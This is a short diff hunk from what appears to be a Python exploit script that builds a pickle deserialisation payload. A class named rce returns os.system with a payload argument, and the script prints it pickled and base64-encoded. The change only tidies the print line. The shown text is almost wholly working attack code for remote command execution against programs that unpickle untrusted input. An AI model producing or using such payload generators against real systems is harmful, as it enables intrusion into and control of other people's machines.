@@ -22,7 +22,7 @@ class rce():
         from os import system
         return (system,(payload,))
         
-print(f'''\nEncoded Payload: {str(b64encode(dumps(rce()))).strip("'b")}\n''')
+print(f'\nEncoded Payload: {b64encode(dumps(rce())).decode("utf-8")}\n')
 
 
 
